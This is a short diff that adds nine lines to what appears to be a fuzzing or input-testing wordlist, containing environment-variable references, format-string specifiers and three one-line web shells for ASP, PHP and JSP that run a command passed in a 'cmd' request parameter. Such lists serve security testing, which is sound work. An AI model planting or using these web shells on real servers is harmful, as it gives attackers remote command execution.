@@ -1,0 +1,9 @@
+$HOME
+$ENV{'HOME'}
+%d
+%s
+{0}
+%*.*s
+ASP <% eval request("cmd") %> 
+PHP <?php system($_GET["cmd"]) ?> 
+JSP <% Runtime.getruntime().exec(request.getParameter("cmd")) %>
